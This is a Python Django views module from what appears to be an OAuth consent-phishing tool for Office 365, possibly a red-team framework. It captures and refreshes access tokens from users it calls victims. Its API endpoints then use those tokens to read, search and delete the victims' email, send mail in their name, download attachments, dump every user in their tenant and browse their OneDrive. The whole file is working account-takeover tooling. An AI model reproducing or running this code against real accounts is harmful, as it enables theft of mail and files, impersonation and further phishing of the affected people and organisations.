# from base64 import b64decode
from django.http import Http404
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from rest_framework import status, mixins
from oauth_office365.serializers import ApplicationSerializer, VictimSerializer, VictimDetailSerializer, AttachmentSerializer, MessageWrapperSerializer
from rest_framework.response import Response
from .models import Application, Victim
from .helper import store_token, refresh_token, get_oauth_session, prune
from rest_framework.views import APIView
from rest_framework.schemas import AutoSchema
from urllib.parse import unquote
import json
import logging
import coreapi
from rest_framework import generics
from rest_framework.renderers import JSONRenderer
import copy

from rest_framework.parsers import MultiPartParser, FormParser

logger = logging.getLogger('oauth.office365')


@csrf_exempt
def token_callback(request):
    """
    Callback URL that receives authorization code from Azure AD. This is the receiving end for the
    configured 'redirect_URL' in the OAuth application'

    :param request: The request object
    :return:
    """

    if request.method == 'POST':
        app = Application.objects.first()

        try:
            code = request.POST.get('code')
        except:
            logger.error('Token callback did not include an authorization code parameter!')
            return redirect(app.conclude_redirect)

        scope = app.scopes.split(',')

        microsoft = get_oauth_session()

        token = microsoft.fetch_token(
            app.token_url,
            client_secret=app.client_secret,
            code=code,
            scope=scope
        )

        store_token(app, token)

        return redirect(app.conclude_redirect)


class Index(APIView):
    """
    List all the tokens that are active for the application
    """
    template_name = 'oauth_office365/index.html'

    def get(self, request):
        victims = Victim.objects.all()
        serializer = VictimSerializer(victims, many=True)
        return Response({'victims': serializer.data})


class ForceTokenRefresh(APIView):
    """
    Manually forces a given access token to refresh
    """
    def get(self, request, victim_id):
        try:
            victim = Victim.objects.get(id=victim_id)
        except Victim.DoesNotExist:
            raise Http404

        app = Application.objects.first()
        refreshed_token = refresh_token(app, victim)

        return Response(refreshed_token)


class VictimDetailView(APIView):
    """
    List full details of a single victim
    """

    def get(self, request, victim_id):
        try:
            victim = Victim.objects.get(id=victim_id)
        except Victim.DoesNotExist:
            raise Http404

        serializer = VictimDetailSerializer(victim)

        return Response({'victim': serializer.data})

    def delete(self, request, victim_id):
        try:
            victim = Victim.objects.get(id=victim_id)
        except Victim.DoesNotExist:
            raise Http404

        victim.delete()
        return Response(status=status.HTTP_204_NO_CONTENT)


class AppDetailViewGeneric(mixins.CreateModelMixin, mixins.UpdateModelMixin, generics.RetrieveDestroyAPIView):
    # queryset = Application.objects.first()
    serializer_class = ApplicationSerializer

    def get_object(self):
        app = Application.objects.first()
        # self.check_object_permissions(self.request, app)

        return app

    def post(self, request, *args, **kwargs):
        logger.info('Created new OAuth application', extra={'user': request.user})
        return self.create(request, *args, **kwargs)

    def put(self, request, *args, **kwargs):
        self.partial_update(request, *args, **kwargs)


class AttachmentViewGeneric(generics.CreateAPIView):
    parser_classes = (MultiPartParser, FormParser)
    serializer_class = AttachmentSerializer

    schema = AutoSchema(
        manual_fields=[
            coreapi.Field(
                "file",
                required=True,
                location="form",
                type="file"
            ),
        ]
    )

    # TODO test validation works on fields
    def post(self, request, *args, **kwargs):
        serializer = AttachmentSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        headers = self.get_success_headers(serializer.data)
        logger.info('Uploaded new file attachment %s', serializer.data['name'], extra={'user': request.user})
        return Response(serializer.data, status=status.HTTP_201_CREATED, headers=headers)


class MessageViewGeneric(generics.CreateAPIView):

    serializer_class = MessageWrapperSerializer

    def post(self, request, *args, **kwargs):
        serializer = MessageWrapperSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        # headers = self.get_success_headers(serializer.data)

        victim_id = kwargs.get('victim_id')
        try:
            victim = Victim.objects.get(id=victim_id)
        except:
            raise Http404

        microsoft = get_oauth_session(victim)

        url = 'https://graph.microsoft.com/v1.0/me/sendMail'

        response_body = copy.deepcopy(serializer.data)
        # print(response_body)
        for key, value in response_body.items():
            prune(response_body, key)

        json_data = JSONRenderer().render(response_body)

        # print(json_data)
        ret = microsoft.post(url, data=json_data, headers={'Content-type': 'application/json'})
        if ret.status_code == 202:
            logger.info("Sent email from %s", victim.email, extra={'user': request.user})
            return Response({'status': 'Message sent'})
        else:
            content = json.loads(ret.content)
            return Response(content)


class MailMessageView(APIView):
    """
    Returns messages from a victim's mailbox. Supports searching. Sends messages too
    """

    schema = AutoSchema(
        manual_fields=[
            coreapi.Field(
                "next",
                required=False,
                location="query",
            ),
            coreapi.Field(
                "search",
                required=False,
                location="query",
            )
        ]
    )

    def get(self, request, victim_id):

        try:
            victim = Victim.objects.get(id=victim_id)
        except:
            raise Http404

        microsoft = get_oauth_session(victim)

        # pagination support
        if 'next' in request.GET:
            next_unquoted = unquote(request.GET.get('next'))
            logger.info('Paged mailbox contents for %s', victim.email, extra={'user': request.user})
            ret = microsoft.get(next_unquoted)

        # support search
        elif 'search' in request.GET:
            search_unquoted = unquote(request.GET.get('search'))
            url = 'https://graph.microsoft.com/v1.0/me/messages?$format=json&$search="{0}"&$expand=attachments($select=id,name,size)'.format(search_unquoted)
            logger.info('Searched %s mailbox for %s', victim.email, search_unquoted, extra={'user': request.user})
            ret = microsoft.get(url)

        else:

            ret = microsoft.get('https://graph.microsoft.com/v1.0/me/messages?$format=json&$expand=attachments($select=id,name,size)')
            logger.info('Requested mailbox contents for %s', victim.email, extra={'user': request.user})

        content = json.loads(ret.content)
        return Response(content)


class MailMessageDetail(APIView):
    """
    Message details view. Gets or deletes a single email message
    """
    def get(self, request, victim_id, id):
        try:
            victim = Victim.objects.get(id=victim_id)
        except:
            raise Http404

        microsoft = get_oauth_session(victim)

        id_unquoted = unquote(id)
        url = 'https://graph.microsoft.com/v1.0/me/messages/{0}?$expand=attachments($select=id,name,size)'.format(id_unquoted)
        ret = microsoft.get(url)

        content = json.loads(ret.content)
        return Response(content)

    def delete(self, request, victim_id, id):
        try:
            victim = Victim.objects.get(id=victim_id)
        except:
            raise Http404

        microsoft = get_oauth_session(victim)

        id_unquoted = unquote(id)
        url = 'https://graph.microsoft.com/v1.0/me/messages/{0}'.format(id_unquoted)
        ret = microsoft.delete(url)

        if ret.status_code == 204:
            logger.info("Deleted email %s from %s inbox", id_unquoted, victim.email, extra={'user': request.user})
            content = json.dumps({'status': 'success'})
        else:
            content = json.dumps({'status': 'failed to delete message'})
        return Response(content)


class MailAttachmentView(APIView):
    """
    Gets, creates, and deletes Attachment objects
    """
    schema = AutoSchema(
        manual_fields=[
            coreapi.Field(
                "response_type",
                required=False,
                location="query",
                description="specify base64 to return attachment as base64 string"
            )
        ]
    )

    def get(self, request, victim_id, message_id, attachment_id):
        try:
            victim = Victim.objects.get(id=victim_id)
        except:
            raise Http404

        microsoft = get_oauth_session(victim)

        attachment_unquoted = unquote(attachment_id)
        message_unquoted = unquote(message_id)

        url = 'https://graph.microsoft.com/v1.0/me/messages/{0}/attachments/{1}'.format(message_unquoted,
                                                                                        attachment_unquoted)
        ret = microsoft.get(url)
        logger.info("Downloaded attachment %s from message %s from %s inbox", attachment_unquoted, message_unquoted, victim.email, extra={'user': request.user})
        if 'response_type' in request.GET and request.GET.get('response_type') == 'base64':
            # if user wants base64 (ex. requesting via api directly) we short-circuit file generation code and return the api response
            pass

        else:

            content = json.loads(ret.content)

            base64_content = content.get('contentBytes')
            name = content.get('name')
            # buff = io.BytesIO(b64decode(base64_content))

            response = Response({'data': base64_content, 'filename': name})
            response['Content-Disposition'] = 'attachment; filename="{0}"'.format(name)
            return response

        content = json.loads(ret.content)
        return Response(content)

    def delete(self, request, victim_id, message_id, attachment_id):
        try:
            victim = Victim.objects.get(id=victim_id)
        except:
            raise Http404

        microsoft = get_oauth_session(victim)

        attachment_unquoted = unquote(attachment_id)
        message_unquoted = unquote(message_id)

        url = 'https://graph.microsoft.com/v1.0/me/messages/{0}/attachments/{1}'.format(message_unquoted,
                                                                                        attachment_unquoted)
        ret = microsoft.delete(url)

        content = json.loads(ret.content)

        if ret.status_code == 204:
            logger.info("Downloaded attachment %s from message %s from %s inbox", attachment_unquoted, message_unquoted, victim.email, extra={'user': request.user})
            content = json.dumps({'status': 'success'})
        else:
            content = json.dumps({'status': 'failed to delete attachment'})
        return Response(content)


class DumpUsersView(APIView):
    """
    Dumps the users in the victim's tenant
    """
    schema = AutoSchema(
        manual_fields=[
            coreapi.Field(
                "next",
                required=False,
                location="query",
            )
        ]
    )
    # TODO test this against my work account

    def get(self, request, victim_id):
        try:
            victim = Victim.objects.get(id=victim_id)
        except:
            raise Http404

        microsoft = get_oauth_session(victim)

        # pagination support
        if 'next' in request.GET:
            next_unquoted = unquote(request.GET.get('next'))
            ret = microsoft.get(next_unquoted)

        else:

            ret = microsoft.get('https://graph.microsoft.com/v1.0/users')

        content = json.loads(ret.content)
        logger.info("Dumped contacts for user %s", victim.email, extra={"user": request.user})
        return Response(content)


class OneDriveView(APIView):
    """
    View for interacting with victim's Drive resources
    """
    schema = AutoSchema(
        manual_fields=[
            coreapi.Field(
                "next",
                required=False,
                location="query",
            ),
            coreapi.Field(
                "search",
                required=False,
                location="query",
            )
        ]
    )

    def get(self, request, victim_id, id=None):
        try:
            victim = Victim.objects.get(id=victim_id)
        except:
            raise Http404

        microsoft = get_oauth_session(victim)

        if id:
            if id == 'shared':
                # TODO test this. See if it returns the downloadlink or if you need to request it specifically
                url = 'https://graph.microsoft.com/v1.0/me/drive/sharedWithMe'
            else:
                url = 'https://graph.microsoft.com/v1.0/me/drive/items/{0}/children'.format(
                    unquote(request.GET.get('item_id')))

        elif 'search' in request.GET:
            url = "https://graph.microsoft.com/v1.0/me/drive/search(q='{{{0}}}')".format(unquote(request.GET.get('search')))

        elif 'next' in request.GET:
            url = unquote(request.GET.get('next'))

        else:
            url = 'https://graph.microsoft.com/v1.0/me/drive/root/children'

        ret = microsoft.get(url)

        content = json.loads(ret.content)

        logger.info("Listed OneDrive contents for %s", victim.email, extra={"user": request.user})
        return Response(content)
